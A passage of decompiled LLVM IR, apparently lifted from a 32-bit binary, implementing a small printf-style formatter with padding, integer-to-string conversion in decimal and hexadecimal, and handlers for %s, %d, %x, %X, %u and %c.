  %stack_var_-44.0 = phi i32 [ 32, %entry ], [ 32, %dec_label_pc_8650 ], [ 48, %dec_label_pc_8660 ]
  %v1_866c = urem i32 %arg4, 2
  %v2_8670 = icmp eq i32 %v1_866c, 0
  br i1 %v2_8670, label %dec_label_pc_86a0.preheader, label %dec_label_pc_86dc.preheader

dec_label_pc_86a0.preheader:                      ; preds = %dec_label_pc_8668
  %v5_86a816 = icmp sgt i32 %stack_var_-28.0, 0
  br i1 %v5_86a816, label %dec_label_pc_867c.lr.ph, label %dec_label_pc_86dc.preheader

dec_label_pc_867c.lr.ph:                          ; preds = %dec_label_pc_86a0.preheader
  %v2_8684 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_867c

dec_label_pc_867c:                                ; preds = %dec_label_pc_867c.lr.ph, %dec_label_pc_867c
  %stack_var_-28.117 = phi i32 [ %stack_var_-28.0, %dec_label_pc_867c.lr.ph ], [ %v1_8698, %dec_label_pc_867c ]
  %v3_8684 = call i32 @printchar(i32* %v2_8684, i32 %stack_var_-44.0)
  %v3_8688 = load i32, i32* %stack_var_-48, align 4
  %v1_868c = add i32 %v3_8688, 1
  store i32 %v1_868c, i32* %stack_var_-48, align 4
  %v1_8698 = add nsw i32 %stack_var_-28.117, -1
  %v5_86a8 = icmp sgt i32 %stack_var_-28.117, 1
  br i1 %v5_86a8, label %dec_label_pc_867c, label %dec_label_pc_86dc.preheader

dec_label_pc_86dc.preheader:                      ; preds = %dec_label_pc_867c, %dec_label_pc_86a0.preheader, %dec_label_pc_8668
  %v3_872027 = phi i32 [ 0, %dec_label_pc_8668 ], [ 0, %dec_label_pc_86a0.preheader ], [ %v1_868c, %dec_label_pc_867c ]
  %stack_var_-28.2.ph = phi i32 [ %stack_var_-28.0, %dec_label_pc_8668 ], [ %stack_var_-28.0, %dec_label_pc_86a0.preheader ], [ 0, %dec_label_pc_867c ]
  %v2_86e09 = load i8, i8* %arg2, align 1
  %v2_86e411 = icmp eq i8 %v2_86e09, 0
  br i1 %v2_86e411, label %dec_label_pc_8714.preheader, label %dec_label_pc_86b0.lr.ph

dec_label_pc_86b0.lr.ph:                          ; preds = %dec_label_pc_86dc.preheader
  %v2_86c0 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_86b0

dec_label_pc_86b0:                                ; preds = %dec_label_pc_86b0.lr.ph, %dec_label_pc_86b0
  %v4_86dc13 = phi i32 [ %tmp, %dec_label_pc_86b0.lr.ph ], [ %v1_86d4, %dec_label_pc_86b0 ]
  %stack_var_-24.012 = phi i8* [ %arg2, %dec_label_pc_86b0.lr.ph ], [ %v5_86d8, %dec_label_pc_86b0 ]
  %v2_86b4 = load i8, i8* %stack_var_-24.012, align 1
  %v3_86b4 = zext i8 %v2_86b4 to i32
  %v3_86c0 = call i32 @printchar(i32* %v2_86c0, i32 %v3_86b4)
  %v3_86c4 = load i32, i32* %stack_var_-48, align 4
  %v1_86c8 = add i32 %v3_86c4, 1
  store i32 %v1_86c8, i32* %stack_var_-48, align 4
  %v1_86d4 = add i32 %v4_86dc13, 1
  %v5_86d8 = inttoptr i32 %v1_86d4 to i8*
  %v2_86e0 = load i8, i8* %v5_86d8, align 1
  %v2_86e4 = icmp eq i8 %v2_86e0, 0
  br i1 %v2_86e4, label %dec_label_pc_8714.preheader, label %dec_label_pc_86b0

dec_label_pc_8714.preheader:                      ; preds = %dec_label_pc_86b0, %dec_label_pc_86dc.preheader
  %v3_872026 = phi i32 [ %v3_872027, %dec_label_pc_86dc.preheader ], [ %v1_86c8, %dec_label_pc_86b0 ]
  %v5_871c6 = icmp sgt i32 %stack_var_-28.2.ph, 0
  br i1 %v5_871c6, label %dec_label_pc_86f0.lr.ph, label %dec_label_pc_8720

dec_label_pc_86f0.lr.ph:                          ; preds = %dec_label_pc_8714.preheader
  %v2_86f8 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_86f0

dec_label_pc_86f0:                                ; preds = %dec_label_pc_86f0.lr.ph, %dec_label_pc_86f0
  %stack_var_-28.37 = phi i32 [ %stack_var_-28.2.ph, %dec_label_pc_86f0.lr.ph ], [ %v1_870c, %dec_label_pc_86f0 ]
  %v3_86f8 = call i32 @printchar(i32* %v2_86f8, i32 %stack_var_-44.0)
  %v3_86fc = load i32, i32* %stack_var_-48, align 4
  %v1_8700 = add i32 %v3_86fc, 1
  store i32 %v1_8700, i32* %stack_var_-48, align 4
  %v1_870c = add nsw i32 %stack_var_-28.37, -1
  %v5_871c = icmp sgt i32 %stack_var_-28.37, 1
  br i1 %v5_871c, label %dec_label_pc_86f0, label %dec_label_pc_8720

dec_label_pc_8720:                                ; preds = %dec_label_pc_86f0, %dec_label_pc_8714.preheader
  %v3_8720 = phi i32 [ %v3_872026, %dec_label_pc_8714.preheader ], [ %v1_8700, %dec_label_pc_86f0 ]
  store i32 %v3_85b0, i32* @fp, align 4
  ret i32 %v3_8720

; uselistorder directives
  uselistorder i32 %v1_86d4, { 1, 0 }
  uselistorder i32 %stack_var_-40.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_860c, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i8* %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_86f0, { 1, 0 }
  uselistorder label %dec_label_pc_86b0, { 1, 0 }
  uselistorder label %dec_label_pc_867c, { 1, 0 }
  uselistorder label %dec_label_pc_8668, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8650, { 1, 0 }
  uselistorder label %dec_label_pc_85fc, { 1, 0 }
}

define i32 @printi(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_8738 = load i32, i32* @fp, align 4
  store i32 34624, i32* %stack_var_-4, align 4
  %v2_873c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_873c, i32* @fp, align 4
  %v1_8770 = icmp slt i32 %arg2, 0
  %v2_8770 = icmp eq i32 %arg2, 0
  br i1 %v2_8770, label %dec_label_pc_8778, label %dec_label_pc_87ac

dec_label_pc_8778:                                ; preds = %entry
  store i32 48, i32* %stack_var_-28, align 4
  %v5_879c = bitcast i32* %stack_var_-28 to i8*
  %v6_879c = call i32 @prints(i32 %arg1, i8* %v5_879c, i32 %arg5, i32 %arg6, i32 0)
  br label %dec_label_pc_890c

dec_label_pc_87ac:                                ; preds = %entry
  %v2_87b0 = icmp eq i32 %arg4, 0
  br i1 %v2_87b0, label %dec_label_pc_87e4, label %dec_label_pc_87b8

dec_label_pc_87b8:                                ; preds = %dec_label_pc_87ac
  %v7_87bc = icmp eq i32 %arg3, 10
  br i1 %v7_87bc, label %dec_label_pc_87c4, label %dec_label_pc_87e4

dec_label_pc_87c4:                                ; preds = %dec_label_pc_87b8
  br i1 %v1_8770, label %dec_label_pc_87d0, label %dec_label_pc_87e4

dec_label_pc_87d0:                                ; preds = %dec_label_pc_87c4
  %v1_87dc = sub i32 0, %arg2
  br label %dec_label_pc_87e4

dec_label_pc_87e4:                                ; preds = %dec_label_pc_87c4, %dec_label_pc_87b8, %dec_label_pc_87ac, %dec_label_pc_87d0
  %stack_var_-52.0 = phi i32 [ %arg2, %dec_label_pc_87ac ], [ %v1_87dc, %dec_label_pc_87d0 ], [ %arg2, %dec_label_pc_87c4 ], [ %arg2, %dec_label_pc_87b8 ]
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_87ac ], [ 1, %dec_label_pc_87d0 ], [ 0, %dec_label_pc_87c4 ], [ 0, %dec_label_pc_87b8 ]
  %tmp26 = bitcast i32* %stack_var_-17 to i8*
  store i8 0, i8* %tmp26, align 4
  %v2_88784 = icmp eq i32 %stack_var_-52.0, 0
  br i1 %v2_88784, label %dec_label_pc_8880, label %dec_label_pc_8800.lr.ph

dec_label_pc_8800.lr.ph:                          ; preds = %dec_label_pc_87e4
  %v1_8828 = add i32 %arg7, -58
  br label %dec_label_pc_8800

dec_label_pc_8800:                                ; preds = %dec_label_pc_8800.lr.ph, %dec_label_pc_8838
  %stack_var_-52.16 = phi i32 [ %stack_var_-52.0, %dec_label_pc_8800.lr.ph ], [ %v2_880c, %dec_label_pc_8838 ]
  %stack_var_-68.05 = phi i8* [ %tmp26, %dec_label_pc_8800.lr.ph ], [ %v5_8840, %dec_label_pc_8838 ]
  %v2_880c = udiv i32 %stack_var_-52.16, %arg3
  %v3_880c = urem i32 %stack_var_-52.16, %arg3
  %v7_8820 = icmp slt i32 %v3_880c, 10
  br i1 %v7_8820, label %dec_label_pc_8838, label %dec_label_pc_8824

dec_label_pc_8824:                                ; preds = %dec_label_pc_8800
  %v2_8830 = add i32 %v3_880c, %v1_8828
  br label %dec_label_pc_8838

dec_label_pc_8838:                                ; preds = %dec_label_pc_8800, %dec_label_pc_8824
  %stack_var_-64.0 = phi i32 [ %v3_880c, %dec_label_pc_8800 ], [ %v2_8830, %dec_label_pc_8824 ]
  %v4_8838 = ptrtoint i8* %stack_var_-68.05 to i32
  %v1_883c = add i32 %v4_8838, -1
  %v5_8840 = inttoptr i32 %v1_883c to i8*
  %fold = add i32 %stack_var_-64.0, 48
  %v1_8858 = trunc i32 %fold to i8
  store i8 %v1_8858, i8* %v5_8840, align 1
  %v2_8878 = icmp ult i32 %stack_var_-52.16, %arg3
  br i1 %v2_8878, label %dec_label_pc_8880, label %dec_label_pc_8800

dec_label_pc_8880:                                ; preds = %dec_label_pc_8838, %dec_label_pc_87e4
  %stack_var_-68.0.lcssa = phi i8* [ %tmp26, %dec_label_pc_87e4 ], [ %v5_8840, %dec_label_pc_8838 ]
  %v2_8884 = icmp eq i32 %stack_var_-60.0, 0
  br i1 %v2_8884, label %dec_label_pc_88e8, label %dec_label_pc_888c

dec_label_pc_888c:                                ; preds = %dec_label_pc_8880
  %v3_888c = load i32, i32* %stack_var_0, align 4
  %v2_8890 = icmp eq i32 %v3_888c, 0
  br i1 %v2_8890, label %dec_label_pc_88d0, label %dec_label_pc_8898

dec_label_pc_8898:                                ; preds = %dec_label_pc_888c
  %v1_889c = and i32 %arg6, 2
  %v2_88a0 = icmp eq i32 %v1_889c, 0
  br i1 %v2_88a0, label %dec_label_pc_88d0, label %dec_label_pc_88a8

dec_label_pc_88a8:                                ; preds = %dec_label_pc_8898
  %v2_88b0 = inttoptr i32 %arg1 to i32*
  %v3_88b0 = call i32 @printchar(i32* %v2_88b0, i32 45)
  %v3_88c0 = load i32, i32* %stack_var_0, align 4
  %v1_88c4 = add i32 %v3_88c0, -1
  store i32 %v1_88c4, i32* %stack_var_0, align 4
  br label %dec_label_pc_88e8

dec_label_pc_88d0:                                ; preds = %dec_label_pc_8898, %dec_label_pc_888c
  %v4_88d0 = ptrtoint i8* %stack_var_-68.0.lcssa to i32
  %v1_88d4 = add i32 %v4_88d0, -1
  %v5_88d8 = inttoptr i32 %v1_88d4 to i8*
  store i8 45, i8* %v5_88d8, align 1
  br label %dec_label_pc_88e8

dec_label_pc_88e8:                                ; preds = %dec_label_pc_8880, %dec_label_pc_88a8, %dec_label_pc_88d0
  %stack_var_-68.1 = phi i8* [ %stack_var_-68.0.lcssa, %dec_label_pc_8880 ], [ %v5_88d8, %dec_label_pc_88d0 ], [ %stack_var_-68.0.lcssa, %dec_label_pc_88a8 ]
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_8880 ], [ 0, %dec_label_pc_88d0 ], [ 1, %dec_label_pc_88a8 ]
  %v3_88f0 = load i32, i32* %stack_var_0, align 4
  %v6_88f8 = call i32 @prints(i32 %arg1, i8* %stack_var_-68.1, i32 %v3_88f0, i32 %arg6, i32 ptrtoint (i32* @0 to i32))
  %v2_8904 = add i32 %v6_88f8, %stack_var_-56.0
  br label %dec_label_pc_890c

dec_label_pc_890c:                                ; preds = %dec_label_pc_8778, %dec_label_pc_88e8
  %storemerge2 = phi i32 [ %v2_8904, %dec_label_pc_88e8 ], [ %v6_879c, %dec_label_pc_8778 ]
  store i32 %v3_8738, i32* @fp, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8* %stack_var_-68.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v5_8840, { 0, 2, 1 }
  uselistorder i32 %v3_880c, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.16, { 0, 2, 1 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_890c, { 1, 0 }
  uselistorder label %dec_label_pc_88e8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8838, { 1, 0 }
  uselistorder label %dec_label_pc_8800, { 1, 0 }
  uselistorder label %dec_label_pc_87e4, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-18 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8920 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8920, i32* @ip, align 4
  store i32 35116, i32* %stack_var_-4, align 4
  %v2_8928 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8928, i32* @fp, align 4
  %stack_var_-32.428 = inttoptr i32 %arg2 to i8*
  %v2_8cd429 = load i8, i8* %stack_var_-32.428, align 1
  %v2_8cd831 = icmp eq i8 %v2_8cd429, 0
  br i1 %v2_8cd831, label %dec_label_pc_8ce0, label %dec_label_pc_8948.lr.ph

dec_label_pc_8948.lr.ph:                          ; preds = %entry
  %v5_8c8c = bitcast i32* %stack_var_-18 to i8*
  br label %dec_label_pc_8948

dec_label_pc_8948:                                ; preds = %dec_label_pc_8948.lr.ph, %dec_label_pc_8cc4
  %stack_var_-32.435 = phi i8* [ %stack_var_-32.428, %dec_label_pc_8948.lr.ph ], [ %stack_var_-32.4, %dec_label_pc_8cc4 ]
  %stack_var_-32.4.in34 = phi i32 [ %arg2, %dec_label_pc_8948.lr.ph ], [ %v1_8cc8, %dec_label_pc_8cc4 ]
  %stack_var_-36.133 = phi i32 [ %arg3, %dec_label_pc_8948.lr.ph ], [ %stack_var_-36.0, %dec_label_pc_8cc4 ]
  %stack_var_-44.132 = phi i32 [ 0, %dec_label_pc_8948.lr.ph ], [ %stack_var_-44.0, %dec_label_pc_8cc4 ]
  %v2_894c = load i8, i8* %stack_var_-32.435, align 1
  %v7_8950 = icmp eq i8 %v2_894c, 37
  br i1 %v7_8950, label %dec_label_pc_8958, label %dec_label_pc_8ca4

dec_label_pc_8958:                                ; preds = %dec_label_pc_8948
  %v1_895c = add i32 %stack_var_-32.4.in34, 1
  %v5_8960 = inttoptr i32 %v1_895c to i8*
  %v2_8978 = load i8, i8* %v5_8960, align 1
  %v2_897c = icmp eq i8 %v2_8978, 0
  br i1 %v2_897c, label %dec_label_pc_8ce0, label %dec_label_pc_8984

dec_label_pc_8984:                                ; preds = %dec_label_pc_8958
  %v2_8988 = load i8, i8* %v5_8960, align 1
  %v7_898c = icmp eq i8 %v2_8988, 37
  br i1 %v7_898c, label %dec_label_pc_8ca4, label %dec_label_pc_8994

dec_label_pc_8994:                                ; preds = %dec_label_pc_8984
  %v2_8998 = load i8, i8* %v5_8960, align 1
  %v7_899c = icmp eq i8 %v2_8998, 45
  br i1 %v7_899c, label %dec_label_pc_89a4, label %dec_label_pc_89d4.preheader

dec_label_pc_89a4:                                ; preds = %dec_label_pc_8994
  %v1_89a8 = add i32 %stack_var_-32.4.in34, 2
  %v5_89ac = inttoptr i32 %v1_89a8 to i8*
  br label %dec_label_pc_89d4.preheader

dec_label_pc_89d4.preheader:                      ; preds = %dec_label_pc_89a4, %dec_label_pc_8994
  %stack_var_-32.0.ph = phi i8* [ %v5_8960, %dec_label_pc_8994 ], [ %v5_89ac, %dec_label_pc_89a4 ]
  %stack_var_-48.0.ph = phi i32 [ 0, %dec_label_pc_8994 ], [ 1, %dec_label_pc_89a4 ]
  %v4_89d42 = ptrtoint i8* %stack_var_-32.0.ph to i32
  %v2_89d83 = load i8, i8* %stack_var_-32.0.ph, align 1
  %v7_89dc7 = icmp eq i8 %v2_89d83, 48
  br i1 %v7_89dc7, label %dec_label_pc_89bc, label %dec_label_pc_8a20.preheader

dec_label_pc_89bc:                                ; preds = %dec_label_pc_89d4.preheader, %dec_label_pc_89bc
  %v4_89d49 = phi i32 [ %v1_89c0, %dec_label_pc_89bc ], [ %v4_89d42, %dec_label_pc_89d4.preheader ]
  %stack_var_-48.08 = phi i32 [ %v1_89cc, %dec_label_pc_89bc ], [ %stack_var_-48.0.ph, %dec_label_pc_89d4.preheader ]
  %v1_89c0 = add i32 %v4_89d49, 1
  %v5_89c4 = inttoptr i32 %v1_89c0 to i8*
  %v1_89cc = or i32 %stack_var_-48.08, 2
  %v2_89d8 = load i8, i8* %v5_89c4, align 1
  %v7_89dc = icmp eq i8 %v2_89d8, 48
  br i1 %v7_89dc, label %dec_label_pc_89bc, label %dec_label_pc_8a20.preheader

dec_label_pc_8a20.preheader:                      ; preds = %dec_label_pc_89bc, %dec_label_pc_89d4.preheader
  %stack_var_-48.0.lcssa = phi i32 [ %stack_var_-48.0.ph, %dec_label_pc_89d4.preheader ], [ %v1_89cc, %dec_label_pc_89bc ]
  %stack_var_-32.0.lcssa = phi i8* [ %stack_var_-32.0.ph, %dec_label_pc_89d4.preheader ], [ %v5_89c4, %dec_label_pc_89bc ]
  %v4_8a2011 = ptrtoint i8* %stack_var_-32.0.lcssa to i32
  %v2_8a2412 = load i8, i8* %stack_var_-32.0.lcssa, align 1
  %tmp60 = icmp ult i8 %v2_8a2412, 48
  br i1 %tmp60, label %dec_label_pc_8a40, label %dec_label_pc_8a30

dec_label_pc_89e8:                                ; preds = %dec_label_pc_8a30
  %v2_89f4 = mul i32 %stack_var_-52.019, 10
  %v2_8a00 = load i8, i8* %stack_var_-32.120, align 1
  %v3_8a00 = zext i8 %v2_8a00 to i32
  %v1_8a04 = add i32 %v2_89f4, -48
  %v2_8a0c = add i32 %v1_8a04, %v3_8a00
  %v1_8a18 = add i32 %v4_8a2021, 1
  %v5_8a1c = inttoptr i32 %v1_8a18 to i8*
  %v2_8a24 = load i8, i8* %v5_8a1c, align 1
  %tmp61 = icmp ult i8 %v2_8a24, 48
  br i1 %tmp61, label %dec_label_pc_8a40, label %dec_label_pc_8a30

dec_label_pc_8a30:                                ; preds = %dec_label_pc_8a20.preheader, %dec_label_pc_89e8
  %v4_8a2021 = phi i32 [ %v1_8a18, %dec_label_pc_89e8 ], [ %v4_8a2011, %dec_label_pc_8a20.preheader ]
  %stack_var_-32.120 = phi i8* [ %v5_8a1c, %dec_label_pc_89e8 ], [ %stack_var_-32.0.lcssa, %dec_label_pc_8a20.preheader ]
  %stack_var_-52.019 = phi i32 [ %v2_8a0c, %dec_label_pc_89e8 ], [ 0, %dec_label_pc_8a20.preheader ]
  %v2_8a34 = load i8, i8* %stack_var_-32.120, align 1
  %tmp62 = icmp ult i8 %v2_8a34, 58
  br i1 %tmp62, label %dec_label_pc_89e8, label %dec_label_pc_8a40

dec_label_pc_8a40:                                ; preds = %dec_label_pc_89e8, %dec_label_pc_8a30, %dec_label_pc_8a20.preheader
  %stack_var_-52.0.lcssa = phi i32 [ 0, %dec_label_pc_8a20.preheader ], [ %v2_8a0c, %dec_label_pc_89e8 ], [ %stack_var_-52.019, %dec_label_pc_8a30 ]
  %stack_var_-32.1.lcssa = phi i8* [ %stack_var_-32.0.lcssa, %dec_label_pc_8a20.preheader ], [ %v5_8a1c, %dec_label_pc_89e8 ], [ %stack_var_-32.120, %dec_label_pc_8a30 ]
  %v2_8a44 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8a48 = icmp eq i8 %v2_8a44, 115
  br i1 %v7_8a48, label %dec_label_pc_8a50, label %dec_label_pc_8ab4

dec_label_pc_8a50:                                ; preds = %dec_label_pc_8a40
  %v1_8a54 = add i32 %stack_var_-36.133, 4
  %v1_8a60 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8a60 = load i32, i32* %v1_8a60, align 4
  %v2_8a6c = icmp eq i32 %v2_8a60, 0
  br i1 %v2_8a6c, label %dec_label_pc_8a80, label %dec_label_pc_8a74

dec_label_pc_8a74:                                ; preds = %dec_label_pc_8a50
  %v5_8a78 = inttoptr i32 %v2_8a60 to i8*
  br label %dec_label_pc_8a88

dec_label_pc_8a80:                                ; preds = %dec_label_pc_8a50
  br label %dec_label_pc_8a88

dec_label_pc_8a88:                                ; preds = %dec_label_pc_8a74, %dec_label_pc_8a80
  %storemerge = phi i8* [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1daf4.30, i32 0, i32 0), %dec_label_pc_8a80 ], [ %v5_8a78, %dec_label_pc_8a74 ]
  %v7_8a9c = call i32 @prints(i32 %tmp, i8* %storemerge, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 ptrtoint (i32* @0 to i32))
  %v2_8aa8 = add i32 %v7_8a9c, %stack_var_-44.132
  br label %dec_label_pc_8cc4

dec_label_pc_8ab4:                                ; preds = %dec_label_pc_8a40
  %v2_8ab8 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8abc = icmp eq i8 %v2_8ab8, 100
  br i1 %v7_8abc, label %dec_label_pc_8ac4, label %dec_label_pc_8b18

dec_label_pc_8ac4:                                ; preds = %dec_label_pc_8ab4
  %v1_8ac8 = add i32 %stack_var_-36.133, 4
  %v1_8ad4 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8ad4 = load i32, i32* %v1_8ad4, align 4
  %v7_8b00 = call i32 @printi(i32 %tmp, i32 %v2_8ad4, i32 10, i32 1, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 97)
  %v2_8b0c = add i32 %v7_8b00, %stack_var_-44.132
  br label %dec_label_pc_8cc4

dec_label_pc_8b18:                                ; preds = %dec_label_pc_8ab4
  %v2_8b1c = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8b20 = icmp eq i8 %v2_8b1c, 120
  br i1 %v7_8b20, label %dec_label_pc_8b28, label %dec_label_pc_8b7c

dec_label_pc_8b28:                                ; preds = %dec_label_pc_8b18
  %v1_8b2c = add i32 %stack_var_-36.133, 4
  %v1_8b38 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8b38 = load i32, i32* %v1_8b38, align 4
  %v7_8b64 = call i32 @printi(i32 %tmp, i32 %v2_8b38, i32 16, i32 0, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 97)
  %v2_8b70 = add i32 %v7_8b64, %stack_var_-44.132
  br label %dec_label_pc_8cc4

dec_label_pc_8b7c:                                ; preds = %dec_label_pc_8b18
  %v2_8b80 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8b84 = icmp eq i8 %v2_8b80, 88
  br i1 %v7_8b84, label %dec_label_pc_8b8c, label %dec_label_pc_8be0

dec_label_pc_8b8c:                                ; preds = %dec_label_pc_8b7c
  %v1_8b90 = add i32 %stack_var_-36.133, 4
  %v1_8b9c = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8b9c = load i32, i32* %v1_8b9c, align 4
  %v7_8bc8 = call i32 @printi(i32 %tmp, i32 %v2_8b9c, i32 16, i32 0, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 65)
  %v2_8bd4 = add i32 %v7_8bc8, %stack_var_-44.132
  br label %dec_label_pc_8cc4

dec_label_pc_8be0:                                ; preds = %dec_label_pc_8b7c
  %v2_8be4 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8be8 = icmp eq i8 %v2_8be4, 117
  br i1 %v7_8be8, label %dec_label_pc_8bf0, label %dec_label_pc_8c44

dec_label_pc_8bf0:                                ; preds = %dec_label_pc_8be0
  %v1_8bf4 = add i32 %stack_var_-36.133, 4
  %v1_8c00 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8c00 = load i32, i32* %v1_8c00, align 4
  %v7_8c2c = call i32 @printi(i32 %tmp, i32 %v2_8c00, i32 10, i32 0, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 97)
  %v2_8c38 = add i32 %v7_8c2c, %stack_var_-44.132
  br label %dec_label_pc_8cc4

dec_label_pc_8c44:                                ; preds = %dec_label_pc_8be0
  %v2_8c48 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8c4c = icmp eq i8 %v2_8c48, 99
  br i1 %v7_8c4c, label %dec_label_pc_8c54, label %dec_label_pc_8cc4

dec_label_pc_8c54:                                ; preds = %dec_label_pc_8c44
  %v1_8c58 = add i32 %stack_var_-36.133, 4
  %v1_8c64 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8c64 = load i32, i32* %v1_8c64, align 4
  %v1_8c68 = urem i32 %v2_8c64, 256
  store i32 %v1_8c68, i32* %stack_var_-18, align 4
  %v6_8c8c = call i32 @prints(i32 %tmp, i8* %v5_8c8c, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 %v1_8c58)
  %v2_8c98 = add i32 %v6_8c8c, %stack_var_-44.132
  br label %dec_label_pc_8cc4

dec_label_pc_8ca4:                                ; preds = %dec_label_pc_8948, %dec_label_pc_8984
  %stack_var_-32.2 = phi i8* [ %v5_8960, %dec_label_pc_8984 ], [ %stack_var_-32.435, %dec_label_pc_8948 ]
  %v2_8ca8 = load i8, i8* %stack_var_-32.2, align 1
  %v3_8ca8 = zext i8 %v2_8ca8 to i32
  %v3_8cb4 = call i32 @printchar(i32* %arg1, i32 %v3_8ca8)
  %v1_8cbc = add i32 %stack_var_-44.132, 1
  br label %dec_label_pc_8cc4

dec_label_pc_8cc4:                                ; preds = %dec_label_pc_8c44, %dec_label_pc_8c54, %dec_label_pc_8bf0, %dec_label_pc_8b8c, %dec_label_pc_8b28, %dec_label_pc_8a88, %dec_label_pc_8ac4, %dec_label_pc_8ca4
  %stack_var_-44.0 = phi i32 [ %v1_8cbc, %dec_label_pc_8ca4 ], [ %v2_8aa8, %dec_label_pc_8a88 ], [ %v2_8b0c, %dec_label_pc_8ac4 ], [ %v2_8b70, %dec_label_pc_8b28 ], [ %v2_8bd4, %dec_label_pc_8b8c ], [ %v2_8c38, %dec_label_pc_8bf0 ], [ %v2_8c98, %dec_label_pc_8c54 ], [ %stack_var_-44.132, %dec_label_pc_8c44 ]
  %stack_var_-36.0 = phi i32 [ %stack_var_-36.133, %dec_label_pc_8ca4 ], [ %v1_8a54, %dec_label_pc_8a88 ], [ %v1_8ac8, %dec_label_pc_8ac4 ], [ %v1_8b2c, %dec_label_pc_8b28 ], [ %v1_8b90, %dec_label_pc_8b8c ], [ %v1_8bf4, %dec_label_pc_8bf0 ], [ %v1_8c58, %dec_label_pc_8c54 ], [ %stack_var_-36.133, %dec_label_pc_8c44 ]
  %stack_var_-32.3 = phi i8* [ %stack_var_-32.2, %dec_label_pc_8ca4 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8a88 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8ac4 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8b28 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8b8c ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8bf0 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8c54 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8c44 ]
  %v4_8cc4 = ptrtoint i8* %stack_var_-32.3 to i32
  %v1_8cc8 = add i32 %v4_8cc4, 1
  %stack_var_-32.4 = inttoptr i32 %v1_8cc8 to i8*
  %v2_8cd4 = load i8, i8* %stack_var_-32.4, align 1
  %v2_8cd8 = icmp eq i8 %v2_8cd4, 0
  br i1 %v2_8cd8, label %dec_label_pc_8ce0, label %dec_label_pc_8948

dec_label_pc_8ce0:                                ; preds = %dec_label_pc_8958, %dec_label_pc_8cc4, %entry
  %stack_var_-44.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-44.132, %dec_label_pc_8958 ], [ %stack_var_-44.0, %dec_label_pc_8cc4 ]
  %v2_8ce4 = icmp eq i32* %arg1, null
  br i1 %v2_8ce4, label %dec_label_pc_8cfc, label %dec_label_pc_8cec

dec_label_pc_8cec:                                ; preds = %dec_label_pc_8ce0
  %v2_8cf0 = load i32, i32* %arg1, align 4
  %v3_8cf8 = inttoptr i32 %v2_8cf0 to i8*
  store i8 0, i8* %v3_8cf8, align 1
  br label %dec_label_pc_8cfc

dec_label_pc_8cfc:                                ; preds = %dec_label_pc_8ce0, %dec_label_pc_8cec
  ret i32 %stack_var_-44.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_-32.4, { 1, 0 }
  uselistorder i8* %stack_var_-32.1.lcssa, { 12, 11, 9, 7, 5, 3, 1, 10, 8, 6, 4, 2, 0 }
  uselistorder i32 %stack_var_-52.0.lcssa, { 1, 2, 3, 4, 5, 0 }
  uselistorder i8* %stack_var_-32.0.lcssa, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-48.0.lcssa, { 5, 4, 3, 2, 1, 0 }
